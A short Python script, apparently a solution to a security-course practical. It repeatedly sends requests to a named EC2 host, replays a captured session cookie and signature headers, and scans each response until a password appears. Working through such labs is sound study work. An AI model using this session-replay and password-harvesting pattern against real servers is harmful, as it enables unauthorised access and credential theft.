import requests
count = 0

a = True
while a:
#http request containing the headers to target website
    r=requests.get("http://ec2-34-207-132-244.compute-1.amazonaws.com", headers={"Host": "ec2-34-207-132-244.compute-1.amazonaws.com","User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language": "en-US,en;q=0.5","X-Authorization-Date": "2018-05-12","X-Session-Id": "Z2F4NVRSVGZLNjkxN2cvOUVzVVNRK2ZXczdwMGltMW9DRFlxeEJERHhmbFBRblluelZBNkkwTDA4SlpFeTlOeTg1U2FMUWkyUmtqQ3Z3NzJWb3pTWGl0a292UzkzVUFuUzVPL1B1Q2lTeEhhUDl0VThCbEVMYzgrUUd5dFFtRTdVczBuaWtURmhkeENyTjBjMjlmbHE0bzlKelZIWkI2ZjUrWnFVYlFYNGlRQWIwYklNMDlJNlBNZ2xnSXRHa0RPalBsOHJHVTZjd2pJeUpjSzRtb3pEM05PM2NGZGxldDJmR2hTbFB6OWFubz0tLXM4cTVrWjZMUUVaNGNKaVBKa29rU3c9PQ%3D%3D--1e6dff0ad02f13976a0912dfc29459b7fe969110","X-Signature-AllComp": "8bd2e4db84ae0ef68a1068466b54e3e76bb1f720","Cookie": "_sncpractical_session=Z2F4NVRSVGZLNjkxN2cvOUVzVVNRK2ZXczdwMGltMW9DRFlxeEJERHhmbFBRblluelZBNkkwTDA4SlpFeTlOeTg1U2FMUWkyUmtqQ3Z3NzJWb3pTWGl0a292UzkzVUFuUzVPL1B1Q2lTeEhhUDl0VThCbEVMYzgrUUd5dFFtRTdVczBuaWtURmhkeENyTjBjMjlmbHE0bzlKelZIWkI2ZjUrWnFVYlFYNGlRQWIwYklNMDlJNlBNZ2xnSXRHa0RPalBsOHJHVTZjd2pJeUpjSzRtb3pEM05PM2NGZGxldDJmR2hTbFB6OWFubz0tLXM4cTVrWjZMUUVaNGNKaVBKa29rU3c9PQ%3D%3D--1e6dff0ad02f13976a0912dfc29459b7fe969110","Connection": "close","Upgrade-Insecure-Requests": "1","If-None-Match": "W/94741588f92347ba631cf8804b936442","Cache-Control": "max-age=0"})
    response = str(r.text)
    print(response)
    lines = response.split('\n')
# to grep the password in the response, response is analysed
    for i in range(len(lines)):
        if 'password' in lines[i]:
            print('success')
            a = False
# count the number of requests to obtain the password
    count = count +1

print (count)